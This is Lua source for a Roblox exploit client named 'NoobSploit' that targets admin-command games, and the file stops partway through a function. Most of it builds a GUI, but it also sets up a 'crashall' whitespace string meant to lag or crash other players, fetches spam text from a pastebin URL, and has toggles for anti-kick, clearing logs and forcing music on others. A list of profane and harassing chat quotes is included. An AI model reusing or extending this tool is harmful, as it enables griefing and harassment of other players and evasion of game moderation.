local AllowMessages = true

function mods()
end

local time = 0

_G.antiabuse = false
_G.rfog = false
_G.vis = false
local AntiGear = false
local antijailgearban = true -- fix the jail gear (Mostly)
local antigrayscale = false -- If it finds the grayscale it removes it for you
local antikill = false -- anti death? idk xd
local antijail = false -- Remove your jail.
local mymusiconly = false -- Force your music onto peoples ears
local mymusiconly_ID = 0 -- mymusiconly song ID
local antilogs = false -- Clears logs when someone opens it!
local Superlogs = false -- Every chat /w /t /c /e etc will print into console
local everyonecommands = false 
local padsEnforcement = false 
local antiattach = false 
local antivoid = false 
local AntiCrash = false

local antikick = false -- enabled for protection xd
local antikick_keybind = "p"

local house_keybind = "n"
local teleport_keybind = "b"
local respawn_keybind = "v"
local reset_keybind = "c"
local fly_keybind = "z"
local AttachTO_keybind = "m"
local AttachDelete_keybind = ""
local allowcrash = false

local oofkohlsPmSpam = game:HttpGet("https://pastebin.com/raw/d7eTDKbJ")
local onekspaces = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        "
local crashall_Text = onekspaces.."g"..onekspaces.."g"..onekspaces.."g"..onekspaces.."g"..onekspaces.."g"..onekspaces

Quotes = {"i completely cleared a khols admin server","What every tool in AdminJoy looks like when doing the command ;alltools","ayyyyy i have the owner of admin joy","he is my friend","ClassicClient-source","DDOSER-APRIL2-PATCH.exe","FastColoredTextBox.dll","Best MCPE hack IS NoobSploit :D","Powered by muffins","gg ez kid","Use the force bitch, Use the force.","I hope you've had a nice start to the week.","raw/d7eTDKbJ","Burned bitch!","ow they dont know u?","bitch","heart","my","steal","Fuck you -Ex_zivye(NOT REALLY)","you can also get private info via exif","i hope u didnt add for clearlogs I word cuz ill hate u",";kill all, What why no work?!?!?!?!",";fly plzz",":shrek me",":admin me",":fly","\"Commands\"","yo mama xd","Hi! So, you know on ragdoll, I wanna do that baloon thing, do you know how-",";fly","you okay? also, im here to help. if you need help, tell me!","no joke tho- im here to help you if you need help-","Remove the l from clock-","viewing logs I see","aDmIn mE", "Hey bitch~","NoobSploits the best MC hack","Fortnite sucks.","Only I can clearlogs","Adminjoy users aren't bright","Do Win+X for perm!","IM GAMERBOY80!","nice bobs","What are you doing step bro!","local dick = \"NONE\"","May i put my token next to yours...","Among.Us.v2020.11.17s","i have a working kick script","Yo anyone","omg nooooo!!!!","PEE","this will be a roblox id in less then 3 days","Subway Sexist - Subway Surfers Rap"," German SpongeBob [EARRAPE] ","Why do i get more suggestions from NoobSploits general then its suggestions channel...","can someone tell me a free excuter i can use?","[Content Deleted]","#### YOU #####","Laamy we in da same server what a goat","what is #other-scripts for","wearedevs.net = VIRUS","Im bored, learn lua.","function ChangeColour(Part, Colour)","omg11!!1","the only differents is when he sees me he stands there tripping me ;-;","i met admin joy wner too!1 !11","easyexploits.dll","yes heres so not virus.exe [FILE.txt]","OMG YOU ARE HACKER?1?11/!?/1/!?","Make anti-tp (Im trying)","Took me all fucking day to get this shit","Whats that step br- WHAT!","HACOR!?!?!??!!??","laamy is hacer","i dont think wkick works","[Laggy Text Here]","i-, wdym????"}

local crashall = false
local Wteskking = "none"
local wkicking = false
local Wwkicking = "none"
local spamming = false
local Wspamming = "nothing"

local mousee = game.Players.LocalPlayer:GetMouse()
local Players = game:GetService("Players")
local tween = game:GetService'TweenService'
local plrs = game:GetService'Players'
local lp = plrs.LocalPlayer

local mod_Data = nil -- Dont edit this is how the mod gets data like NoobSploits prefix or modules toggled.





-- Gui to Lua
-- Version: 3.2

-- Instances:

local list = Instance.new("ScreenGui")
local AntiKill = Instance.new("TextLabel")
local off = Instance.new("Frame")
local On = Instance.new("Frame")
local AntiGears = Instance.new("TextLabel")
local off1 = Instance.new("Frame")
local On1 = Instance.new("Frame")

--Properties:

list.Name = "list"
list.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
list.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

AntiKill.Name = "AntiKill"
AntiKill.Parent = list
AntiKill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiKill.BackgroundTransparency = 1.000
AntiKill.Position = UDim2.new(0.864000022, 0, 0.916999996, 0)
AntiKill.Size = UDim2.new(0, 200, 0, 50)
AntiKill.Font = Enum.Font.SourceSans
AntiKill.Text = "AntiKill"
AntiKill.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiKill.TextSize = 14.000

off.Name = "off"
off.Parent = AntiKill
off.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
off.Position = UDim2.new(0.736986399, 0, 0.188013315, 0)
off.Size = UDim2.new(0, 30, 0, 30)

On.Name = "On"
On.Parent = AntiKill
On.BackgroundColor3 = Color3.fromRGB(38, 255, 0)
On.BackgroundTransparency = 1.000
On.Position = UDim2.new(0.736986399, 0, 0.188013315, 0)
On.Size = UDim2.new(0, 30, 0, 30)

AntiGears.Name = "AntiGears"
AntiGears.Parent = list
AntiGears.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiGears.BackgroundTransparency = 1.000
AntiGears.Position = UDim2.new(0.864000022, 0, 0.86524713, 0)
AntiGears.Size = UDim2.new(0, 200, 0, 50)
AntiGears.Font = Enum.Font.SourceSans
AntiGears.Text = "AntiGears"
AntiGears.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiGears.TextSize = 14.000

off1.Name = "off1"
off1.Parent = AntiGears
off1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
off1.Position = UDim2.new(0.736986399, 0, 0.188013315, 0)
off1.Size = UDim2.new(0, 30, 0, 30)

On1.Name = "On1"
On1.Parent = AntiGears
On1.BackgroundColor3 = Color3.fromRGB(38, 255, 0)
On1.BackgroundTransparency = 1.000
On1.Position = UDim2.new(0.736986399, 0, 0.188013315, 0)
On1.Size = UDim2.new(0, 30, 0, 30)

game:GetService("Players").LocalPlayer.PlayerGui.list.ResetOnSpawn = false























local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
local Workspace_Folder = Game_Folder.Workspace
local Admin_Folder = Game_Folder.Admin
local Stable_Check = false
local v1 = "PaintPart"




local http = game:GetService'HttpService'
local plrs = game:GetService'Players'
local tween = game:GetService('TweenService')
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
function jsone(str) return http:JSONEncode(str) end
function jsond(str) return http:JSONDecode(str) end
if not isfolder('Noobsploit') then
	makefolder('Noobsploit')
end
local uidata
if isfile('Noobsploit\\Noobsploit.json') then
	local filedata = readfile('Noobsploit\\Noobsploit.json')
	uidata = jsond(filedata)
else
	uidata = {
		backgroundcolor = {
			r = 146,
			g = 70,
			b = 231
		},
		highlightcolor = {
			r = 255,
			g = 255,
			b = 255
		},
		startupcmds = {},
		highlightedusers = {},
		detecthidden = false,
		highlightfriends = false,
		highlightteam = false,
		highlightself = false,
		prefix = '.',
		startupcmdsenabled = false,
		fpsboost = false
	}
end
local prefix = uidata.prefix
function updatefile()
	local suc,er = pcall(function()
		writefile('Noobsploit\\Noobsploit.json', jsone(uidata))
	end)
	if not suc then warn(er) end
end
if not uidata.blacklist then
	uidata.blacklist = {}
	updatefile()
end

workspace.DescendantAdded:Connect(function(child)
	if uidata.fpsboost then
		coroutine.wrap(function()
			if child:IsA('Explosion') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('ForceField') then
				if child.Parent:FindFirstChild('Poop') then
					game:GetService'RunService'.Heartbeat:Wait()
					child:Destroy()
				else
					child.Name = 'Poop'
				end
			elseif child:IsA('Sparkles') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Smoke') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			end
		end)()
	end
end)
local boolbuttons = {}
local guielements = {}
local highlighted = {}
local edits = {}
Noobsploit=Instance.new("ScreenGui")
Noobsploit.ResetOnSpawn=false
Topbar=Instance.new("Frame")
UICorner=Instance.new("UICorner")
TextLabel=Instance.new("TextLabel")
UICorner_2=Instance.new("UICorner")
Close=Instance.new("TextButton")
Corner=Instance.new("Frame")
Main=Instance.new("Frame")
UICorner_3=Instance.new("UICorner")
Container=Instance.new("Frame")
UICorner_4=Instance.new("UICorner")
ChatSettings=Instance.new("ScrollingFrame")
Options=Instance.new("Frame")
UIGridLayout=Instance.new("UIGridLayout")
ColorPick=Instance.new("Frame")
TextLabel_2=Instance.new("TextLabel")
BoxFrame=Instance.new("Frame")
UICorner_5=Instance.new("UICorner")
TextBox=Instance.new("TextBox")
UICorner_6=Instance.new("UICorner")
Dropdown=Instance.new("Frame")
UIGridLayout_2=Instance.new("UIGridLayout")
Option=Instance.new("Frame")
TextLabel_3=Instance.new("TextLabel")
Frame=Instance.new("Frame")
TextButton=Instance.new("TextButton")
UICorner_7=Instance.new("UICorner")
UICorner_8=Instance.new("UICorner")
Option2=Instance.new("Frame")
TextLabel_4=Instance.new("TextLabel")
Frame_2=Instance.new("Frame")
TextButton_2=Instance.new("TextButton")
UICorner_9=Instance.new("UICorner")
UICorner_10=Instance.new("UICorner")
Option3=Instance.new("Frame")
TextLabel_5=Instance.new("TextLabel")
Frame_3=Instance.new("Frame")
TextButton_3=Instance.new("TextButton")
UICorner_11=Instance.new("UICorner")
UICorner_12=Instance.new("UICorner")
Option3_2=Instance.new("Frame")
TextLabel_6=Instance.new("TextLabel")
Frame_4=Instance.new("Frame")
TextButton_4=Instance.new("TextButton")
UICorner_13=Instance.new("UICorner")
TextLabel_7=Instance.new("TextLabel")
UICorner_14=Instance.new("UICorner")
Option3_3=Instance.new("Frame")
Option3_4=Instance.new("Frame")
TextLabel_8=Instance.new("TextLabel")
ButtonFrame=Instance.new("Frame")
TextButton_5=Instance.new("TextButton")
UICorner_15=Instance.new("UICorner")
UICorner_16=Instance.new("UICorner")
BoxFrame_2=Instance.new("Frame")
UICorner_17=Instance.new("UICorner")
TextBox_2=Instance.new("TextBox")
UICorner_18=Instance.new("UICorner")
Dropdown_2=Instance.new("Frame")
UIGridLayout_3=Instance.new("UIGridLayout")
Logs=Instance.new("Frame")
List=Instance.new("ScrollingFrame")
Commands=Instance.new("Frame")
CmdList=Instance.new("ScrollingFrame")
General=Instance.new("ScrollingFrame")
GnACont=Instance.new("Frame")
BlacklistCont=Instance.new("Frame")
Settings=Instance.new("Frame")
Options_2=Instance.new("Frame")
UIGridLayout_4=Instance.new("UIGridLayout")
PrefixFrame=Instance.new("Frame")
TextLabel_9=Instance.new("TextLabel")
BoxFrame_3=Instance.new("Frame")
UICorner_19=Instance.new("UICorner")
TextBox_3=Instance.new("TextBox")
UICorner_20=Instance.new("UICorner")
FpsBoostFrame=Instance.new("Frame")
TextLabel_10=Instance.new("TextLabel")
Frame_5=Instance.new("Frame")
TextButton_6=Instance.new("TextButton")
UICorner_21=Instance.new("UICorner")
UICorner_22=Instance.new("UICorner")
Option3_5=Instance.new("Frame")
TextLabel_11=Instance.new("TextLabel")
Frame_6=Instance.new("Frame")
UICorner_23=Instance.new("UICorner")
Frame_7=Instance.new("Frame")
ScrollingFrame=Instance.new("ScrollingFrame")
TextBox_4=Instance.new("TextBox")
Option3_6=Instance.new("Frame")
Option3_7=Instance.new("Frame")
Startupcmds=Instance.new("Frame")
TextLabel_12=Instance.new("TextLabel")
Frame_8=Instance.new("Frame")
TextButton_7=Instance.new("TextButton")
UICorner_24=Instance.new("UICorner")
UICorner_25=Instance.new("UICorner")
Option3_8=Instance.new("Frame")
BackColor=Instance.new("TextLabel")
BoxFrame_4=Instance.new("Frame")
UICorner_26=Instance.new("UICorner")
TextBox_5=Instance.new("TextBox")
UICorner_27=Instance.new("UICorner")
Frame_9=Instance.new("Frame")
TextButton_8=Instance.new("TextButton")
UICorner_28=Instance.new("UICorner")
UICorner_29=Instance.new("UICorner")
UICorner_30=Instance.new("UICorner")
UICorner_31=Instance.new("UICorner")
Tablist=Instance.new("ScrollingFrame")
UICorner_32=Instance.new("UICorner")
UIListLayout=Instance.new("UIListLayout")
LogsBtn=Instance.new("TextButton")
UICorner_33=Instance.new("UICorner")
GeneralBtn=Instance.new("TextButton")
GnABtn=Instance.new("TextButton")
BlacklistBtn=Instance.new("TextButton")
UICorner_34=Instance.new("UICorner")
CommandsBtn=Instance.new("TextButton")
UICorner_35=Instance.new("UICorner")
ChatSettingsBtn=Instance.new("TextButton")
UICorner_36=Instance.new("UICorner")
SettingsBtn=Instance.new("TextButton")
UICorner_37=Instance.new("UICorner")
UICorner_38=Instance.new("UICorner")-- Gui to Lua
-- Version: 3.2

-- Instances:

-- Instances:

local Frame1 = Instance.new("Frame")
guielements[#guielements+1] = Frame1
local thumb = Instance.new("ImageLabel")
local CmdsFrame = Instance.new("ScrollingFrame")
guielements[#guielements+1] = CmdsFrame
local Cmdsa = Instance.new("TextBox")
guielements[#guielements+1] = Cmdsa
local UsersFrame = Instance.new("ScrollingFrame")
guielements[#guielements+1] = UsersFrame
local UIGridLayout3 = Instance.new("UIGridLayout")
local Frame_22 = Instance.new("Frame")
guielements[#guielements+1] = Frame_22
local TextLabell = Instance.new("TextLabel")
guielements[#guielements+1] = TextLabell
local Optionss = Instance.new("Frame")
guielements[#guielements+1] = Optionss
local Confirmm = Instance.new("Frame")
guielements[#guielements+1] = Confirmm
local TextLabel_22 = Instance.new("TextLabel")
guielements[#guielements+1] = TextLabel_22
local Yes = Instance.new("Frame")
guielements[#guielements+1] = Yes
local Yes_2 = Instance.new("TextButton")
guielements[#guielements+1] = Yes_2
local UICornerrr = Instance.new("UICorner")
local No = Instance.new("Frame")
guielements[#guielements+1] = No
local No_2 = Instance.new("TextButton")
guielements[#guielements+1] = No_2
local UICorner_22 = Instance.new("UICorner")
local PlayerDropp = Instance.new("Frame")
guielements[#guielements+1] = PlayerDropp
local TextBoxx = Instance.new("TextBox")
guielements[#guielements+1] = TextBoxx
local UICorner_33 = Instance.new("UICorner")
local Dropdownn = Instance.new("Frame")
guielements[#guielements+1] = Dropdownn
local Dropdown_2q = Instance.new("Frame")
guielements[#guielements+1] = Dropdown_2q
local UICorner_44 = Instance.new("UICorner")
local UIGridLayout_2q = Instance.new("UIGridLayout")
local UICorner_55 = Instance.new("UICorner")
local Add = Instance.new("Frame")
guielements[#guielements+1] = Add
local UICorner_66 = Instance.new("UICorner")
local TextButtonnn = Instance.new("TextButton")
guielements[#guielements+1] = TextButtonnn

BlacklistCont.Name = "Blacklist"
BlacklistCont.Parent = Container
BlacklistCont.Active = true
guielements['blacklist'] = BlacklistCont
BlacklistCont.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlacklistCont.BackgroundTransparency = 1.000
BlacklistCont.Size = UDim2.new(1, 0, 1, 0)
BlacklistCont.Visible = false
--Properties:


Frame1.Parent = BlacklistCont
Frame1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame1.Position = UDim2.new(0, 0, 0, 0)
Frame1.Size = UDim2.new(1, 0, 1, 0)

thumb.Name = "thumb"
thumb.Parent = Frame1
thumb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
thumb.BackgroundTransparency = 1.000
thumb.BorderSizePixel = 0
thumb.Size = UDim2.new(0, 90, 0, 90)

CmdsFrame.Name = "CmdsFrame"
CmdsFrame.Parent = Frame1
CmdsFrame.Active = true
CmdsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CmdsFrame.BorderColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
CmdsFrame.Position = UDim2.new(0, 0, 0, 90)
CmdsFrame.Size = UDim2.new(1, 0, 1, -90)
CmdsFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

Cmdsa.Name = "Cmds"
Cmdsa.Parent = CmdsFrame
Cmdsa.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cmdsa.BackgroundTransparency = 1.000
Cmdsa.Size = UDim2.new(1, 0, 1, 0)
Cmdsa.ClearTextOnFocus = false
Cmdsa.Font = Enum.Font.SourceSans
Cmdsa.MultiLine = true
Cmdsa.Text = ""
Cmdsa.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Cmdsa.TextSize = 16.000
Cmdsa.TextXAlignment = Enum.TextXAlignment.Left
Cmdsa.TextYAlignment = Enum.TextYAlignment.Top

UsersFrame.Name = "UsersFrame"
UsersFrame.Parent = Frame1
UsersFrame.Active = true
UsersFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
UsersFrame.BorderSizePixel = 0
UsersFrame.Position = UDim2.new(1, -141, 0, 0)
UsersFrame.Size = UDim2.new(0, 141, 0, 89)
UsersFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
UsersFrame.ScrollBarThickness = 10

UIGridLayout3.Parent = UsersFrame
UIGridLayout3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout3.CellPadding = UDim2.new(0, 2, 0, 2)
UIGridLayout3.CellSize = UDim2.new(1, -10, 0, 20)
UIGridLayout3.FillDirectionMaxCells = 1

Frame_22.Parent = UsersFrame
Frame_22.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Frame_22.Size = UDim2.new(0, 100, 0, 100)

TextLabell.Parent = Frame_22
TextLabell.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabell.Position = UDim2.new(0, 2, 0, 2)
TextLabell.Size = UDim2.new(1, -4, 1, -4)
TextLabell.Font = Enum.Font.SourceSans
TextLabell.Text = "Blacklisted Users"
TextLabell.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabell.TextScaled = true
TextLabell.TextSize = 14.000
TextLabell.TextWrapped = true

Optionss.Name = "Options"
Optionss.Parent = Frame1
Optionss.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Optionss.BorderSizePixel = 0
Optionss.Position = UDim2.new(0, 124, 0, 0)
Optionss.Size = UDim2.new(1, -265, 0, 89)

Confirmm.Name = "Confirm"
Confirmm.Parent = Optionss
Confirmm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Confirmm.BackgroundTransparency = 1.000
Confirmm.BorderSizePixel = 0
Confirmm.Position = UDim2.new(0, 0, 0, 50)
Confirmm.Size = UDim2.new(1, 0, 1, -50)
Confirmm.Visible = false

TextLabel_22.Parent = Confirmm
TextLabel_22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_22.BackgroundTransparency = 1.000
TextLabel_22.Size = UDim2.new(1, 0, 0, 20)
TextLabel_22.Font = Enum.Font.SourceSans
TextLabel_22.Text = "Are you sure?"
TextLabel_22.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextLabel_22.TextSize = 14.000

Yes.Name = "Yes"
Yes.Parent = Confirmm
Yes.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Yes.Position = UDim2.new(0, 0, 1, -15)
Yes.Size = UDim2.new(0.400000006, 0, 0, 15)

Yes_2.Name = "Yes"
Yes_2.Parent = Yes
Yes_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Yes_2.BorderSizePixel = 0
Yes_2.Position = UDim2.new(0, 1, 0, 1)
Yes_2.Size = UDim2.new(1, -2, 1, -2)
Yes_2.Font = Enum.Font.SourceSans
Yes_2.Text = "Yes"
Yes_2.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Yes_2.TextSize = 14.000

UICornerrr.CornerRadius = UDim.new(0, 2)
UICornerrr.Parent = Yes_2

No.Name = "No"
No.Parent = Confirmm
No.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
No.Position = UDim2.new(0.600000024, 0, 1, -15)
No.Size = UDim2.new(0.400000006, 0, 0, 15)

No_2.Name = "No"
No_2.Parent = No
No_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
No_2.BorderSizePixel = 0
No_2.Position = UDim2.new(0, 1, 0, 1)
No_2.Size = UDim2.new(1, -2, 1, -2)
No_2.Font = Enum.Font.SourceSans
No_2.Text = "No"
No_2.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
No_2.TextSize = 14.000

UICorner_22.CornerRadius = UDim.new(0, 2)
UICorner_22.Parent = No_2

PlayerDropp.Name = "PlayerDrop"
PlayerDropp.Parent = Optionss
PlayerDropp.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
PlayerDropp.Size = UDim2.new(1, 0, 0, 25)
PlayerDropp.ZIndex = 2

TextBoxx.Parent = PlayerDropp
TextBoxx.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBoxx.BorderSizePixel = 0
TextBoxx.Position = UDim2.new(0, 2, 0, 2)
TextBoxx.Size = UDim2.new(1, -4, 1, -4)
TextBoxx.ClearTextOnFocus = false
TextBoxx.Font = Enum.Font.SourceSans
TextBoxx.Text = "Player"
TextBoxx.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextBoxx.TextScaled = true
TextBoxx.TextSize = 14.000
TextBoxx.TextWrapped = true

UICorner_33.CornerRadius = UDim.new(0, 2)
UICorner_33.Parent = TextBox

Dropdownn.Name = "Dropdown"
Dropdownn.Parent = TextBoxx
Dropdownn.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Dropdownn.BackgroundTransparency = 0.300
Dropdownn.ClipsDescendants = true
Dropdownn.Position = UDim2.new(0, 8, 1, 0)
Dropdownn.Size = UDim2.new(1, -16, 0, 0)
Dropdownn.Visible = false

Dropdown_2q.Name = "Dropdown"
Dropdown_2q.Parent = Dropdownn
Dropdown_2q.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Dropdown_2q.ClipsDescendants = true
Dropdown_2q.Position = UDim2.new(0, 2, 0, 2)
Dropdown_2q.Size = UDim2.new(1, -4, 1, -4)

UICorner_44.CornerRadius = UDim.new(0, 2)
UICorner_44.Parent = Dropdown_2q

UIGridLayout_2q.Parent = Dropdown_2q
UIGridLayout_2q.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout_2q.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2q.CellPadding = UDim2.new(0, 2, 0, 2)
UIGridLayout_2q.CellSize = UDim2.new(1, -10, 0, 20)

UICorner_55.CornerRadius = UDim.new(0, 2)
UICorner_55.Parent = PlayerDropp

Add.Name = "Add"
Add.Parent = Optionss
Add.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
Add.Position = UDim2.new(0.119999997, 0, 0, 30)
Add.Size = UDim2.new(0.75, 0, 0, 25)

UICorner_66.CornerRadius = UDim.new(0, 2)
UICorner_66.Parent = Add

TextButtonnn.Parent = Add
TextButtonnn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButtonnn.Position = UDim2.new(0, 2, 0, 2)
TextButtonnn.Size = UDim2.new(1, -4, 1, -4)
TextButtonnn.Font = Enum.Font.SourceSans
TextButtonnn.Text = "Add To Blacklist"
TextButtonnn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextButtonnn.TextScaled = true
TextButtonnn.TextSize = 14.000
TextButtonnn.TextStrokeColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
TextButtonnn.TextWrapped = true

local plrs = game:GetService'Players'
local blusers = UsersFrame

local backg = Instance.new('Frame')
backg.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)--USERDATA

local templateBtn = Instance.new('TextButton', backg)
templateBtn.Name = 'Button'
templateBtn.Size = UDim2.new(1, -25, 1, -4)
templateBtn.Position = UDim2.new(0, 2, 0, 2)
templateBtn.BackgroundTransparency = 0
templateBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
templateBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
templateBtn.TextXAlignment = Enum.TextXAlignment.Left
templateBtn.TextScaled = true
local exit = Instance.new('TextButton', backg)
exit.Name = 'Close'
exit.Text = 'X'
exit.TextColor3 = Color3.fromRGB(200, 0, 0)
exit.Size = UDim2.new(0, 20, 1, -2)
exit.Position = UDim2.new(1, -22, 0, 1)
exit.BackgroundColor3 = Color3.fromRGB(0,0,0)
exit.BackgroundTransparency = 0
exit.BorderSizePixel = 0


local backg2 = Instance.new('Frame')
backg2.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)--USERDATA
local templateBtn = Instance.new('TextButton', backg2)
templateBtn.Name = 'Button'
templateBtn.Size = UDim2.new(1, -2, 1, -2)
templateBtn.Position = UDim2.new(0, 1, 0, 1)
templateBtn.BackgroundTransparency = 0
templateBtn.BackgroundColor3 = Color3.fromRGB(0,0,0)
templateBtn.TextColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
templateBtn.TextXAlignment = Enum.TextXAlignment.Center
templateBtn.TextScaled = true


local options = Optionss
local confirm = Confirmm
local cmds = Cmdsa
local thumbnail = thumb
local lp = plrs.LocalPlayer
local tween = game:GetService'TweenService'
local add = TextButtonnn
local info = TweenInfo.new(.3, Enum.EasingStyle.Quint)
local box = TextBoxx
local drop = Dropdown_2q
local hide = tween:Create(drop.Parent, info, {Size = UDim2.new(.9, 0, 0, 0)})
local show = tween:Create(drop.Parent, info, {Size = UDim2.new(.9, 0, 0, 55)})
local m = game:GetService('Players').LocalPlayer:GetMouse()
cmds:GetPropertyChangedSignal('Text'):Connect(function()
	cmds.Size = UDim2.new(1, 0, 1, 0)
	local shift = false
	if cmds.Parent.CanvasPosition.Y > (cmds.Parent.CanvasSize.Y.Offset-cmds.Parent.AbsoluteSize.Y-10) then
		shift = true
	end
	cmds.Parent.CanvasSize = UDim2.new(1, 0, 0, cmds.TextBounds.Y)
	if shift then cmds.Parent.CanvasPosition = Vector2.new(0, cmds.Parent.CanvasSize.Y.Offset) end
end)
Cmdsa.FocusLost:Connect(function()
	local name = box.Text
	local id
	pcall(function()
		id = plrs:GetUserIdFromNameAsync(name)
	end)
	if id then
		print(id)
		if uidata['blacklist'][tostring(id)] then
			local tab = Cmdsa.Text:split('\n')
			uidata['blacklist'][tostring(id)] = tab
			updatefile()
		end
	end
end)
UIGridLayout3:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
	blusers.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout3.AbsoluteContentSize.Y)
end)
function isHoveringOverObj(obj)
	local tx = obj.AbsolutePosition.X
	local ty = obj.AbsolutePosition.Y
	local bx = tx + obj.AbsoluteSize.X
	local by = ty + obj.AbsoluteSize.Y
	if m.X >= tx and m.Y >= ty and m.X <= bx and m.Y <= by then
		return true
	end
end

box.Focused:Connect(function()
	if box.Text == 'Player' then
		box.Text = ''
	end
	box.TextTransparency = 0
	drop.Parent.Visible = true
	show:Play()
	show.Completed:Wait()
end)
box.FocusLost:Connect(function()
	if box.Text == '' then
		box.TextTransparency = .6
		box.Text = 'Player'
	end
	if not isHoveringOverObj(drop) then
		hide:Play()
		hide.Completed:Wait()
		drop.Parent.Visible = false
	else
		drop.MouseLeave:Wait()
		hide:Play()
		hide.Completed:Wait()
		drop.Parent.Visible = false
	end
	local id
	pcall(function()
		id = plrs:GetUserIdFromNameAsync(box.Text)
	end)
	if tonumber(id) then
		local thumb = plrs:GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
		thumbnail.Image = thumb
		local name = plrs:GetNameFromUserIdAsync(id)
		box.Text = name
	end
end)
box:GetPropertyChangedSignal('Text'):Connect(function(oldText)
	for i,v in pairs(plrs:GetPlayers()) do
		local btn = drop:FindFirstChild(v.Name)
		if btn then
			if v.Name:lower():sub(1, box.Text:len()) ~= box.Text:lower() and box.Text ~= 'Player' then
				btn.Visible = false
			else
				btn.Visible = true
				print('ass')
			end
		end
	end
	local id
	pcall(function()
		id = plrs:GetUserIdFromNameAsync(box.Text)
	end)
	if tonumber(id) and box.Text ~= 'Player' then
		local thumb = plrs:GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
		thumbnail.Image = thumb
		local cmdstuff = uidata['blacklist'][tostring(id)] or uidata['blacklist'][tostring(id)]
		if cmdstuff then
			cmds.Text = table.concat(cmdstuff, '\n')
		else
			cmds.Text = ''
		end
	else
		thumbnail.Image = ''
		local cmdstuff = uidata['blacklist'][tostring(id)] or uidata['blacklist'][tostring(id)]
		if cmdstuff then
			cmds.Text = table.concat(cmdstuff, '\n')
		else
			cmds.Text = ''
		end
	end
end)
function addblBtn(id, cmdTable)
	local name
	pcall(function()
		name = plrs:GetNameFromUserIdAsync(id)
	end)
	local back = backg:Clone()
	back.BackgroundColor3 = Color3.fromRGB(uidata.backgroundcolor.r, uidata.backgroundcolor.g, uidata.backgroundcolor.b)
	guielements[#guielements+1] = back
	back.Parent = blusers
	back.Name = name
	local btn = back.Button
	guielements[#guielements+1] = btn
